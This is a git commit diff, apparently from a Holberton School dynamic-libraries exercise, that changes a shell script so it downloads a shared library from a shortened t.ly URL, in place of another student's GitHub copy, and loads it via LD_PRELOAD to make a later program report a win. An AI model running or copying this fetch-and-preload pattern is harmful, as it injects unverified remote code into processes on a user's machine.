d44a592271a98abbd5e3206aa3c1ca0f12a2113a
Abubakar Adam Sani <Athernee@gmail.com>
2023-06-20 08:11:56 +0000

    reverted 101-make_me_win.sh to previos change

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O /tmp/win.so https://github.com/Zevrov/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/win.so
-export LD_PRELOAD=/tmp/win.so
+wget -O /tmp/libmega_mil.so https://t.ly/_Yi-
+export LD_PRELOAD=/tmp/libmega_mil.so
